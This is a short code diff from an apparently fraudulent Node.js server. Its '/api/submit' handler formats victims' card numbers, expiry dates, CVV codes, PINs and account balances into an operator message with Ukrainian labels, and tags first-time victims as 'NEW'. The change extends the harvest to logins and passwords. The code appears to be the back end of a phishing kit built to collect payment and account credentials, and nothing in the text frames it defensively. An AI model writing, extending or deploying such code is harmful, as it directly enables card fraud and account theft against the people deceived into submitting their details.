@@ -155,7 +155,8 @@ app.post('/api/submit', (req, res) => {
         message += `<b>Номер карти:</b> <code>${newData.card_confirm || newData.card || 'Не вказано'}</code>\n`;
         if (newData['card-expiry']) message += `<b>Термін дії:</b> <code>${newData['card-expiry']}</code>\n`;
         if (newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
-        message += `<b>Пін:</b> <code>${newData.pin || 'Не вказано'}</code>\n`;
+        if (newData.login) message += `<b>Логін:</b> <code>${newData.login}</code>\n`;
+        message += `<b>Пін/Пароль:</b> <code>${newData.pin || newData.password || 'Не вказано'}</code>\n`;
         if (newData.balance) message += `<b>Поточний баланс:</b> <code>${newData.balance}</code>\n`;
         if (newData.cardVisitCount) {
             const visitText = newData.cardVisitCount === 1 ? 'NEW' : `${newData.cardVisitCount} раз`;
